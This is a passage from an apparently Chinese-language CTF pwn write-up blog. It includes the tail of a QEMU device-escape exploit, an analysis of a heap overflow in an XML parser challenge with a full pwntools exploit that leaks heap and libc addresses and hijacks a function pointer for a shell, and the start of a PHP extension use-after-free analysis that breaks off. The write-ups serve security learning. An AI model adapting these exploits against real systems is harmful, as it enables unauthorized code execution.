mmio_read(<span class="number">0x18</span>);</span><br><span class="line">    encrypt(res, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *(<span class="keyword">uint64_t</span> *)res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)res - <span class="number">0x25eb0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base: %p\n"</span>, libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system = libc_base + <span class="number">0x30410</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system address: %p\n"</span>, system);</span><br><span class="line"></span><br><span class="line">    res[<span class="number">0</span>] = system &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    res[<span class="number">1</span>] = system &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    decrypt(res, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res[0]: %p\n"</span>, res[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, res[<span class="number">0</span>]);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, res[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    outw(<span class="number">0x0</span>, <span class="number">0xC040</span> + <span class="number">0x8</span>); <span class="comment">// seek = 0x0</span></span><br><span class="line">    mmio_write(<span class="number">0x0</span>, *(<span class="keyword">uint32_t</span> *)<span class="string">"flag"</span>);</span><br><span class="line">    outl(*(<span class="keyword">uint32_t</span> *)<span class="string">"cat "</span>, <span class="number">0xC040</span> + <span class="number">0x1C</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="Truth"><a href="#Truth" class="headerlink" title="Truth"></a>Truth</h1><p>题目给了源码，编译因为是<code>-O3</code>，加上是cpp程序，所以binary会比较难看，直接分析源码即可。</p><ol><li><p>首先，程序实现了一个简单的xml文件解析功能，提供了四个功能：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input file's content"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (read(STDIN_FILENO, &amp;temp, <span class="number">1</span>) &amp;&amp; temp != <span class="string">'\xff'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlContent.push_back(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlfile.parseXml(xmlContent);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Please input the node name which you want to edit"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; nodeName &gt;&gt; content;</span><br><span class="line">    xmlfile.editXML(nodeName, content);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    pnode(*xmlfile.node-&gt;begin(), <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"MEME"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; nodeName;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> temp = pnode(*xmlfile.node-&gt;begin(), <span class="string">""</span>, nodeName)) </span><br><span class="line">        temp-&gt;meme(temp-&gt;backup);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>分别是解析一个xml文件，编辑所给xml文件中给定节点的内容，打印节点信息，以及打印类成员backup中的内容。</p></li><li><p>主要注意到在输入一个xml文件，触发解析逻辑的时候：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> XML_NODE::parseNodeContents(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>::value_type&gt;::iterator&amp; current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (*current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (*current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CHARACTACTERS::LT:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*(current + <span class="number">1</span>) == CHARACTACTERS::SLASH)</span><br><span class="line">&#123;</span><br><span class="line">current += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">auto</span> gt = iterFind(current, CHARACTACTERS::GT);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;nodeName != <span class="built_in">std</span>::<span class="built_in">string</span>&#123; current, gt &#125;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Unmatch!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">current = gt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">++current;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;XML_NODE&gt; node(<span class="built_in">std</span>::make_shared&lt;XML_NODE&gt;());</span><br><span class="line">node-&gt;parse(current);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;node)</span><br><span class="line"><span class="keyword">this</span>-&gt;node = <span class="built_in">std</span>::make_shared &lt; <span class="built_in">std</span>::<span class="built_in">vector</span> &lt; <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;XML_NODE&gt;&gt;&gt;();</span><br><span class="line"><span class="keyword">this</span>-&gt;node-&gt;push_back(node);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CHARACTACTERS::NEWLINE:</span><br><span class="line"><span class="keyword">case</span> CHARACTACTERS::BLANK:</span><br><span class="line">++current;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> lt = iterFind(current, CHARACTACTERS::LT);</span><br><span class="line">data = <span class="built_in">std</span>::make_shared &lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(current, lt);</span><br><span class="line">backup = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// malloc here</span></span><br><span class="line">current = lt;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>backup</code>的大小是固定的由<code>malloc(0x50)</code>得到的，但是后面在<code>editXML</code>中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> XML::editXML(<span class="built_in">std</span>::<span class="built_in">string</span>&amp; name, <span class="built_in">std</span>::<span class="built_in">string</span>&amp; content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> status = getEditStatus(name, content);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status &gt;= <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;XML_NODE&gt; a = pnode(*node-&gt;begin(), <span class="string">""</span>, name);</span><br><span class="line"><span class="keyword">if</span> (a &amp;&amp; a-&gt;nodeName == name)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (status == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">*(a-&gt;data) = content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a-&gt;data-&gt;length(); i++) <span class="comment">// data can be very long</span></span><br><span class="line">&#123;</span><br><span class="line">a-&gt;backup[i] = (*a-&gt;data)[i];</span><br><span class="line">&#125;</span><br><span class="line">*(a-&gt;data) = content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"No such name"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的逻辑是，每次要edit节点内容的时候，会将原来<code>data</code>中的数据放到<code>backup</code>中，然后再用<code>data</code>储存输入的新数据；问题在于，输入的<code>data</code>长度并没有限制，因此复制到<code>backup</code>中的时候，显然存在溢出的可能，于是这里存在一个heap overflow。</p></li><li><p>同时很重要的一点，菜单的第四个功能，是通过类成员中的一个函数指针实现的，即<code>temp-&gt;meme(temp-&gt;backup);</code>中的<code>meme</code>，因此修改该函数指针，即可劫持程序控制流；同时，由于<code>backup</code>是在解析xml文件时分配的内存，因此其处于heap中地址较低处，也就是说，通过溢出<code>backup</code>，可以覆盖到后面地址中存在的许多结构体，也可以leak出其中存在的heap地址和libc地址。此外，由于分析具体的结构体构成比较费力，覆盖heap中数据时，应尽量避免修改原有数据，而主要是找到<code>backup</code>以及<code>meme</code>所在的位置，覆盖该<code>backup</code>指针指向任意地址或者覆盖<code>meme</code>指向<code>onegadget</code>，即可实现任意地址读写以及getshell。</p></li><li><p>因此利用思路为：</p><ul><li>首先参照xml文件格式，编写一个尽量简单的文件交给程序解析，由于整个利用围绕xml中的节点展开，所以这里只定义一个root节点，也方便debug。</li><li>通过<code>editXML</code>，实现溢出<code>backup</code>，再调用<code>temp-&gt;meme(temp-&gt;backup)</code>，将<code>backup</code>后面的heap地址leak出来。</li><li>伪造结构体，控制其中的成员<code>backup</code>为<code>read_got</code>，通过<code>temp-&gt;meme(temp-&gt;backup)</code>来leak出libc地址。</li><li>再控制成员<code>meme</code>为<code>onegadget</code>即可。</li><li>总的来说，很多结构体并没有分析到位，基本通过调试，然后不断试错实现利用的，所以分析写得比较难看。</li></ul></li><li><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)p = remote(<span class="string">'106.14.216.214'</span>, <span class="number">48476</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># menu</span></span><br><span class="line">choose_items = &#123;</span><br><span class="line">    <span class="string">"add"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"edit"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="string">"show"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">"bonus"</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'add'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input file's content"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name, content)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'edit'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input the node name which you want to edit"</span>, name)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'show'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonus</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose(choose_items[<span class="string">'bonus'</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"MEME"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow, leak heap base</span></span><br><span class="line">add(<span class="string">"&lt;?xml version=\"1.0\" ?&gt;&lt;root&gt;"</span> + <span class="string">"A"</span> * <span class="number">0x20</span> + <span class="string">"&lt;/root&gt;\xFF"</span>)</span><br><span class="line">edit(<span class="string">"root"</span>, <span class="string">"B"</span> * <span class="number">0x68</span> + <span class="string">"heapaddr"</span>)</span><br><span class="line">edit(<span class="string">"root"</span>, <span class="string">"C"</span> * <span class="number">0x58</span>)</span><br><span class="line">bonus(<span class="string">"root"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heapaddr"</span>)</span><br><span class="line">heap_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x11f30</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># heap overflow, hijack struct to leak libc base</span></span><br><span class="line">edit(<span class="string">"root"</span>, <span class="string">"D"</span> * <span class="number">0x58</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x405608</span>) + p64(<span class="number">0x0000000100000001</span>) + p64(heap_base + <span class="number">0x12180</span>))</span><br><span class="line">pause()</span><br><span class="line">payload = flat([heap_base + <span class="number">0x121a0</span>, heap_base + <span class="number">0x12190</span>, <span class="number">0x405608</span>, <span class="number">0x0000000100000001</span>, <span class="number">0x405340</span>, heap_base + <span class="number">0x11de8</span>, <span class="number">4</span>, <span class="number">0x746f6f72</span>] + \</span><br><span class="line">               <span class="number">4</span> *[<span class="number">0</span>] + [heap_base + <span class="number">0x11e00</span>] * <span class="number">2</span> + \</span><br><span class="line">               [<span class="number">0</span>] + \</span><br><span class="line">               [heap_base + <span class="number">0x11e70</span>, heap_base + <span class="number">0x11e60</span>] + \</span><br><span class="line">               [<span class="number">0</span>] * <span class="number">2</span> + \</span><br><span class="line">               [elf.got[<span class="string">'read'</span>]])</span><br><span class="line">edit(<span class="string">"root"</span>, payload)</span><br><span class="line">bonus(<span class="string">"root"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Useless"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">'read'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack fp</span></span><br><span class="line">payload = flat([heap_base + <span class="number">0x121a0</span>, heap_base + <span class="number">0x12190</span>, <span class="number">0x405608</span>, <span class="number">0x0000000100000001</span>, heap_base + <span class="number">0x121C0</span>, heap_base + <span class="number">0x11de8</span>, <span class="number">4</span>, <span class="number">0x746f6f72</span>] + \</span><br><span class="line">               [one_gadget, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>] + \</span><br><span class="line">               [heap_base + <span class="number">0x11e00</span>] * <span class="number">2</span> + \</span><br><span class="line">               [<span class="number">0</span>] + \</span><br><span class="line">               [heap_base + <span class="number">0x11e70</span>, heap_base + <span class="number">0x11e60</span>] + \</span><br><span class="line">               [<span class="number">0</span>] * <span class="number">2</span> + \</span><br><span class="line">               [heap_base + <span class="number">0x12228</span>])</span><br><span class="line">edit(<span class="string">"root"</span>, payload)</span><br><span class="line">bonus(<span class="string">"root"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="hackphp"><a href="#hackphp" class="headerlink" title="hackphp"></a>hackphp</h1><p>第一次webpwn，题目本身并不难，主要是调试比较麻烦，Docker build出来的环境都和远程不一致（不知为何）。</p><ol><li><p>分析<code>hackphp.so</code>，主要关注这几个<code>hackphp</code>相关的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zif_hackphp_edit_cold</span><br><span class="line">zif_info_hackphp</span><br><span class="line">zm_activate_hackphp</span><br><span class="line">zif_hackphp_create</span><br><span class="line">zif_hackphp_delete</span><br><span class="line">zif_hackphp_edit</span><br><span class="line">zif_hackphp_get</span><br><span class="line">zif_startup_hackphp</span><br></pre></td></tr></table></figure><p>可以看出模式依然是菜单题模式，其中<code>zif_hackphp_create</code>存在很明显的uaf漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_hackphp_create</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 <span class="built_in">size</span>[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = execute_data-&gt;This.u2.next;</span><br><span class="line">  <span class="built_in">size</span>[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)zend_parse_parameters(v2, &amp;unk_2000, <span class="built_in">size</span>) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">char</span> *)_emalloc(<span class="built_in">size</span>[<span class="number">0</span>]);</span><br><span class="line">    buf = v3;</span><br><span class="line">    buf_size = <span class="built_in">size</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="built_in">size</span>[<span class="number">0</span>] - <span class="number">0x100</span>) &lt;= <span class="number">0x100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        return_value-&gt;u1.type_info = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _efree(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return_value-&gt;u1.type_info = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所给的size不处于0x100~0x200之间时，就会马上调用<code>_efree(v3)</code>给释放掉，但是指针并没有清空，依然可以show和edit。</p></li><li><p>其次，了解到本题中的堆管理机制并不同于ptmalloc，从利用的角度来说，而是有点类似于linux kernel的slab，即单考虑小块内存，总共有以下粒度，同一粒度的chunk最开始来自于某同一page：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">define ZEND_MM_BINS_INFO(_, x, y) \</span><br><span class="line">    _( <span class="number">0</span>,    <span class="number">8</span>,  <span class="number">512</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">1</span>,   <span class="number">16</span>,  <span class="number">256</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">2</span>,   <span class="number">24</span>,  <span class="number">170</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">3</span>,   <span class="number">32</span>,  <span class="number">128</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">4</span>,   <span class="number">40</span>,  <span class="number">102</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">5</span>,   <span class="number">48</span>,   <span class="number">85</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">6</span>,   <span class="number">56</span>,   <span class="number">73</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">7</span>,   <span class="number">64</span>,   <span class="number">64</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">8</span>,   <span class="number">80</span>,   <span class="number">51</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _( <span class="number">9</span>,   <span class="number">96</span>,   <span class="number">42</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">10</span>,  <span class="number">112</span>,   <span class="number">36</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">11</span>,  <span class="number">128</span>,   <span class="number">32</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">12</span>,  <span class="number">160</span>,   <span class="number">25</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">13</span>,  <span class="number">192</span>,   <span class="number">21</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">14</span>,  <span class="number">224</span>,   <span class="number">18</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">15</span>,  <span class="number">256</span>,   <span class="number">16</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">16</span>,  <span class="number">320</span>,   <span class="number">64</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">17</span>,  <span class="number">384</span>,   <span class="number">32</span>, <span class="number">3</span>, x, y) \</span><br><span class="line">    _(<span class="number">18</span>,  <span class="number">448</span>,    <span class="number">9</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">19</span>,  <span class="number">512</span>,    <span class="number">8</span>, <span class="number">1</span>, x, y) \</span><br><span class="line">    _(<span class="number">20</span>,  <span class="number">640</span>,   <span class="number">32</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">21</span>,  <span class="number">768</span>,   <span class="number">16</span>, <span class="number">3</span>, x, y) \</span><br><span class="line">    _(<span class="number">22</span>,  <span class="number">896</span>,    <span class="number">9</span>, <span class="number">2</span>, x, y) \</span><br><span class="line">    _(<span class="number">23</span>, <span class="number">1024</span>,    <span class="number">8</span>, <span class="number">2</span>, x, y) \</span><br><span class="line">    _(<span class="number">24</span>, <span class="number">1280</span>,   <span class="number">16</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">25</span>, <span class="number">1536</span>,    <span class="number">8</span>, <span class="number">3</span>, x, y) \</span><br><span class="line">    _(<span class="number">26</span>, <span class="number">1792</span>,   <span class="number">16</span>, <span class="number">7</span>, x, y) \</span><br><span class="line">    _(<span class="number">27</span>, <span class="number">2048</span>,    <span class="number">8</span>, <span class="number">4</span>, x, y) \</span><br><span class="line">    _(<span class="number">28</span>, <span class="number">2560</span>,    <span class="number">8</span>, <span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">29</span>, <span class="number">3072</span>,    <span class="number">4</span>, <span class="number">3</span>, x, y)</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ZEND_ALLOC_SIZES_H 